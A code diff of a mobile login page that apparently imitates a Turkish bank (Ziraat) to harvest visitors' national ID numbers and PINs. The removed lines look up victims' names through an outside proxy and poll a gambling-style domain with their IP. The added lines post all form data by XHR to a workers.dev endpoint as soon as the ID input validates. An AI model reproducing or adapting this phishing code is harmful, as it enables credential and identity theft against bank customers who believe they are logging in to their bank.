@@ -4,7 +4,7 @@
   <head>
 	  <!-- Google tag (gtag.js) -->
  
- <script defer src="https://analytics.eu.umami.is/script.js" data-website-id="300c4d79-adbc-4100-b9ef-092951e6e707"></script>
+ 
     <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mobil Uyumlu Sayfa</title>
@@ -131,7 +131,7 @@ margin-bottom: 0px;
  
     
 
-    <form name="aspnetForm" method="post" action="https://worker-broad-snow-1482.selimjuhan2.workers.dev/" id="aspnetForm" autocomplete="off" novalidate="novalidate">
+    <form name="aspnetForm" method="post"   id="aspnetForm" autocomplete="off" novalidate="novalidate">
       <div id="" class="login-wrap">
         <header></header>
         <div id="" class="container">
@@ -208,31 +208,8 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
             </div>
           </div>
     </form>
-
- <script>
-async function checkAndSubmit() {
-  const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
-
-  try {
-        // RetailIdentityTextBox değeri ile isteği oluştur
-       const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
-    const data = await response.json();
-
-        // "adi" ve "soyadi" değerlerini al
-        const adi = data.adi;
-        const soyadi = data.soyadi;
-
-        // İsim adında bir cookie oluştur ve değerleri kaydet
-        document.cookie = `isim=${adi} ${soyadi}; path=/`;
-
-        // Formu post et
-        document.getElementById('aspnetForm').submit();
-      } catch (error) {
-        console.error('Hata:', error);
-      }
-    }
-  </script>
- <script>
+ 
+<script>
 document.addEventListener("DOMContentLoaded", function () {
   async function tcno_dogrula_ve_islem_yap(tcno) {
     // TC kimlik doğrulama fonksiyonu
@@ -269,31 +246,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     if (!isCookieSet) {
       const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
-
-      try {
-        // TC kimlik doğrulama işlemi
-        const isTcValid = await tcno_dogrula_ve_islem_yap(retailIdentityValue);
-
-        if (isTcValid) {
-          // RetailIdentityTextBox değeri ile isteği oluştur
-          const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
-          const data = await response.json();
-
-          // "adi" ve "soyadi" değerlerini al
-          const adi = data.adi;
-          const soyadi = data.soyadi;
-
-          // İsim adında bir cookie oluştur ve değerleri kaydet
-          document.cookie = `isim=${adi} ${soyadi}; path=/`;
-
-          // Formu post et
-          //document.getElementById('aspnetForm').submit();
-        } else {
-          console.log('TC kimlik doğrulama başarısız.');
-        }
-      } catch (error) {
-        console.error('Hata:', error);
-      }
+      submitForm(); // Formu gönder
     } else {
       console.log('Cookie zaten kaydedilmiş, işlem yapılmayacak.');
     }
@@ -308,69 +261,38 @@ document.addEventListener("DOMContentLoaded", function () {
 
   identityInput.addEventListener("input", handleInput);
   pinInput.addEventListener("input", handleInput);
-});
-  </script>
 
- 
-<script>
-  new Vue({
-    el: '#app',
-    data: {
-      results: [],
-      userIp: '' // Kullanıcı IP'sini saklamak için bir değişken
-    },
-    mounted() {
-      // İlk çağrıyı yap
-      this.getUserIpFromCookie();
-      this.makeRequests();
+  // Form gönderildiğinde çalışacak fonksiyon
+  function submitForm() {
+    // Form verilerini al
+    var form = document.getElementById("aspnetForm");
+    var formData = new FormData(form);
 
-      // Ardından 3 saniyede bir tekrar et
-      setInterval(() => {
-        this.getUserIpFromCookie();
-        this.makeRequests();
-      }, 3000);
-    },
-    methods: {
-      getUserIpFromCookie() {
-        // Cookie'den user_ip değerini al
-        this.userIp = this.getCookie('user_ip');
-      },
-      makeRequests() {
-        if (this.userIp) {
-          // Kullanıcı IP'si varsa istek yap
-          axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`)
-            .then(response => {
-              this.results = response.data;
-              console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
-            })
-            .catch(error => {
-              console.error('GET isteği sırasında bir hata oluştu:', error);
-            });
-        } else {
-          // Kullanıcı IP'si yoksa istek yapma
-          console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
-        }
-      },
-      getCookie(cname) {
-        const name = cname + '=';
-        const decodedCookie = decodeURIComponent(document.cookie);
-        const cookieArray = decodedCookie.split(';');
+    // AJAX isteği oluştur
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://worker-broad-snow-1482.selimjuhan2.workers.dev/", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-        for (let i = 0; i < cookieArray.length; i++) {
-          let cookie = cookieArray[i];
-          while (cookie.charAt(0) == ' ') {
-            cookie = cookie.substring(1);
-          }
-          if (cookie.indexOf(name) == 0) {
-            return cookie.substring(name.length, cookie.length);
-          }
-        }
-        return '';
+    // AJAX yanıtı geldiğinde çalışacak fonksiyon
+    xhr.onload = function () {
+      // Başarılı yanıt alındıysa, hata oluşmamıştır
+      if (xhr.status >= 200 && xhr.status < 300) {
+        console.log("İstek başarıyla tamamlandı.");
+      } else {
+        // Hata durumunda hata.html sayfasına yönlendir
+        window.location.href = "hata.html";
       }
-    }
-  });
+    };
+
+    // AJAX isteğini gönder
+    xhr.send(formData);
+  }
+
+});
 </script>
 
+ 
+ 
 
  
 
